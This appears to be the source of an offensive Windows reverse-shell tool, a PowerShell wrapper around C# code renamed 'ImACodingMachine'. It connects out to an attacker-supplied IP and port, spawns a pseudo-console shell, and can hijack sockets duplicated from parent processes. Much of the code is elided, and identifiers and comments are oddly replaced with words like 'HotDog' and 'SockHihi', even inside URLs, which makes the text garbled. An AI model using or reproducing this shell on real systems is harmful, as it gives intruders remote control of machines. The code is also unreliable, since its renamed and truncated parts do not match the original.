function Invoke-ImACodingMachine
{   
    <#
        .SYNOPSIS
            ImACodingMachine - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            HotDog: https://github.com/antonioCoco/ImACodingMachine
        ...
        .EXAMPLE  
            PS>Invoke-ImACodingMachine 10.0.0.2 3001
        ...
        .EXAMPLE
            PS>Invoke-ImACodingMachine -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
         ...
         .EXAMPLE
            PS>Invoke-ImACodingMachine -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
        ...
        .EXAMPLE
            PS>Invoke-ImACodingMachine -Upgrade -Rows 30 -Cols 90
    ...
    $parametersImACodingMachine = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    Add-Type -TypeDefinition $HotDog -Language CSharp;
    $output = [ImACodingMachineMainClass]::ImACodingMachineMain($parametersImACodingMachine)
    Write-Output $output
}
...
public class ImACodingMachineException : Exception
{
    private const string error_string = "[-] ImACodingMachineException: ";

    public ImACodingMachineException() { }

    public ImACodingMachineException(string message) : base(error_string + message) { }
}
...
public class MachineHelper
{
    ...
    private uint ThreadCheckDeadlock(uint threadParams)
    {
        ...
        objPtr = SockHihi.NtQueryObjectDynamic(this.targetHandle, SockHihi.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
...
public static class SockHihi
{
    ...
    private static extern bool DuplicateHandle(IntPtr hHotDogProcessHandle, IntPtr hHotDogHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
    ...
    // this from --> https://github.com/hfiref0x/UACME/blob/master/HotDog/Shared/ntos.h
    ...
    private static List<IntPtr> Dupee(List<IntPtr> sockets)
    {
    ...
    private static List<IntPtr> Filter(List<IntPtr> sockets)
    {
    ...
    private static bool TCP(IntPtr socket, out TCP_INFO_v0 tcpInfoOut)
    {
        int result = -1;
    ...
    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
    {
        ...
        if (status == 0)
        {
            // we need an overlapped socket for the HotDogXDDD process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
    ...
    public static List<IntPtr> Target(Process targetProcess)
    {
        ...
        MachineHelper MachineHelperObj = new MachineHelper();
        ...
        for (int i = 0; i < HandlesCount; i++)
        {
            ...
            {
                if (MachineHelperObj.CheckDeadlockDetected(dupHandle))
        ...
        List<IntPtr> dupedSocketsHandles = Dupee(socketsHandles);
        if (dupedSocketsHandles.Count >= 1)
            dupedSocketsHandles = Filter(dupedSocketsHandles);
    ...
    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess)
    {
        ...
        List<IntPtr> parentSocketsHandles = Target(parentProcess);
    ...
    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        ...
        List<IntPtr> targetProcessSockets = Target(targetProcess);
        ...
        if (targetSocketHandle == IntPtr.Zero)
            throw new ImACodingMachineException("No sockets found, so no hijackable sockets :( Exiting...");
    ...
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        ...
        if (result == -1)
            throw new ImACodingMachineException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}

// HotDog from --> https://stackoverflow.com/a/3346055
[StructLayout(LayoutKind.Sequential)]
public struct ParentProcessUtilities
{
    ...
    public static Process GetParentProcess(IntPtr handle)
    {
        ...
        if (status != 0)
            throw new ImACodingMachineException(status.ToString());
        try
        {
...
public static class ImACodingMachine
{
    private const string errorString = "{{{ImACodingMachineException}}}\r\n";
    ...
    private static void InitWSAThread()
    {
        ...
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new ImACodingMachineException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }
    ...
    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        ...
        {
            throw new ImACodingMachineException("Specified port is invalid: " + remotePort.ToString());
        }
        ...
        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            ...
            throw new ImACodingMachineException(String.Format("WSAConnect failed with error code: {0}", error));
        }
    ...
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        ...
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new ImACodingMachineException("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new ImACodingMachineException("Could not create the OutputPipe");
    }
    ...
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        ...
        {
            throw new ImACodingMachineException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new ImACodingMachineException("Could not enable virtual terminal processing");
        }
    }

    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr HotDogXDDDInputPipeRead, ref IntPtr HotDogXDDDOutputPipeWrite, uint rows, uint cols)
    {
        int result = -1;
        ...
        result = CreatePseudoConsole(consoleCoord, HotDogXDDDInputPipeRead, HotDogXDDDOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }
    ...
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        ...
        {
            throw new ImACodingMachineException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new ImACodingMachineException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new ImACodingMachineException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }
    ...
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        ...
        if (!success)
        {
            throw new ImACodingMachineException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }
    ...
    public static string SpawnImACodingMachine(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
        ...
        bool HotDogXDDDCompatible = false;
        ...
        if (HotDogXDDDCompatible)
        {
            ...
            if (upgradeShell)
            {
                ...
                shellSocket = SockHihi.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    ...
                    shellSocket = SockHihi.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        ...
                        shellSocket = SockHihi.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                        if (shellSocket == IntPtr.Zero)
                        {
                            throw new ImACodingMachineException("No \\Device\\Afd objects found. Socket duplication failed.");
                        }
                        else
                        {
                    ...
                    else
                    {
                        ...
                        if (grandParentProcess != null) grandParentSocketInherited = SockHihi.IsSocketInherited(shellSocket, grandParentProcess);
                    }
                }
                else
                {
                    // the current process got a usable socket, let's see if the parents use the socket
                    if (parentProcess != null) parentSocketInherited = SockHihi.IsSocketInherited(shellSocket, parentProcess);
                    if (grandParentProcess != null) grandParentSocketInherited = SockHihi.IsSocketInherited(shellSocket, grandParentProcess);
                }
            }
            else
        ...
        else
        {
            if (upgradeShell)
            {
                output += string.Format("Could not upgrade shell to fully interactive because HotDogXDDD is not compatible on this system");
                return output;
            }
            shellSocket = connectRemote(remoteIp, remotePort);
            if (shellSocket == IntPtr.Zero)
        ...
        // when the HotDogXDDD is destroyed.
        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
        if (upgradeShell) {
            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our HotDogXDDD process
            ...
            if (!IsSocketOverlapped) SockHihi.SetSocketBlockingMode(shellSocket, 1);
        }
        ...
        if (upgradeShell)
        {
            if (!IsSocketOverlapped)
            {
                ...
                SockHihi.SetSocketBlockingMode(shellSocket, 0);
            }
        ...
        output += "ImACodingMachine kindly exited.\r\n";
        return output;
    }
}

public static class ImACodingMachineMainClass
{
    ...
    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new ImACodingMachineException("\r\nImACodingMachine: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }
    ...
    private static string CheckRemoteIpArg(string ipString)
    {
        ...
        if (!IPAddress.TryParse(ipString, out address))
            throw new ImACodingMachineException("\r\nImACodingMachine: Invalid remoteIp value" + ipString);
        return ipString;
    }
    ...
    private static int CheckInt(string arg)
    {
        ...
        if (!Int32.TryParse(arg, out ret))
            throw new ImACodingMachineException("\r\nImACodingMachine: Invalid integer value " + arg);
        return ret;
    }
    ...
    public static string ImACodingMachineMain(string[] args)
    {
        string output = "";
        ...
        else
        {
            ...
            try
            {
                ...
                output = ImACodingMachine.SpawnImACodingMachine(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
...
class MainClass
{
    ...
    {
        Console.Out.Write(ImACodingMachineMainClass.ImACodingMachineMain(args));
    }
}
